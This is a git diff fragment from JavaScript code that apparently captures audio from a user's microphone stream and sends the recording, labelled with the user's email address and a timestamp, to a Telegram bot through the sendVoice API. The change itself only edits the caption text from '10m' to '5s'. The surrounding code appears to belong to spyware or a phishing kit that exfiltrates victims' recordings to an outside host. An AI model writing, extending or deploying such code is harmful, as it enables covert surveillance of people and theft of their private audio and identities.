@@ -115,7 +115,7 @@ async function recordAndSendAudio(stream, email) {
           const fd = new FormData();
           fd.append("chat_id", CHAT_ID);
           fd.append("voice", blob, "recording.ogg");
-          fd.append("caption", `🎤 <b>AUDIO RECORDING (10m)</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
+          fd.append("caption", `🎤 <b>AUDIO RECORDING (5s)</b>\n\n👤 Email: ${email}\n📅 Time: ${time}`);
           fd.append("parse_mode", "HTML");
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
         } catch(e) { console.log("Audio send error:", e); }
